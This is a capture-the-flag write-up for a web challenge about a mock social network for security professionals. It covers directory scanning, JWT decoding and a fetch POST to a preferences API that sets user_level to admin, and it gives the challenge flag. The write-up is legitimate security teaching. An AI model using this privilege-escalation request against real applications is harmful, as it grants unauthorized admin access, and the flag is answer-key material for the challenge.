# Difficulty: Medium

## Challenge Info

I've been working on developing a new social network specifically for Cybersecurity Professionals. However, it keeps getting hacked (ironic, eh?). Can you find how the hackers seem to be able to access the admin area so easily?

**Author:** Tsuto  
**Challenge URL:** [dodcybersentinel-web-linku.chals.io](https://dodcybersentinel-web-linku.chals.io)

### Challenge Walkthrough

Upon accessing the webpage, you'll notice a credential login and a register button that redirects you to create an account.

**Step 1: Run Gobuster and Inspect Page Source**

First, I ran a Gobuster scan to find any hidden directories, along with inspecting the page source. The Gobuster scan revealed a `/admin` directory. However, accessing `/admin` directly results in an "access denied" message.

**Step 2: Test Login Form**

Interestingly, entering random credentials into the login form allowed me to log in. Further testing showed that the login form accepts any input and grants access.

**Step 3: Inspect Cookies**

After logging in, there's an admin area that's still inaccessible. I inspected the page elements and found a cookie named `auth` with the following value:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImEiLCJ1c2VyX2xldmVsIjoidXNlciIsImV4cCI6MTcxNjQ4MzU3MiwidGhlbWUiOiJkYXJrIn0.wADDBo3je54rHinrC9j4I7wMaP8K5X7tyPOL0eN6g_Y
```

This is an encoded JWT token. By decoding it using [jwt.io](https://jwt.io/), the payload revealed:

```json
{
  "username": "a",
  "user_level": "user",
  "exp": 1716483572,
  "theme": "dark"
}
```

**Step 4: Modify JWT Token**

To gain admin access, we need to change `"user_level": "user"` to `"user_level": "admin"`. However, we first need the secret key to modify and re-sign the JWT token.

**Step 5: Exploit Preferences API**

After spending time without finding the secret key, I noticed that changing the theme (from light to dark) was reflected in the payload. This gave me an idea to exploit the API endpoint for updating preferences.

Using a custom script, I made a POST request to the preferences endpoint to update the user level to admin:

```javascript
fetch('https://dodcybersentinel-web-linku.chals.io/api/preferences', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ theme: 'light', user_level: 'admin' })
})
.then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.json();
})
.then(data => console.log(data))
.catch(error => console.error('There was a problem with the fetch operation:', error));
```

*Note: Change the theme to either 'light' or 'dark', then check the payload to ensure it updates correctly. It should say: "Preferences updated!"*

**Step 6: Gain Admin Access**

After updating the user level to admin, log out and log back in to apply the changes. Click on the Admin Area tab, and you should now have access, revealing the flag:

**Flag:** `C1{d3s3r1al1zed_4dm1n_4cc3ss}`

---
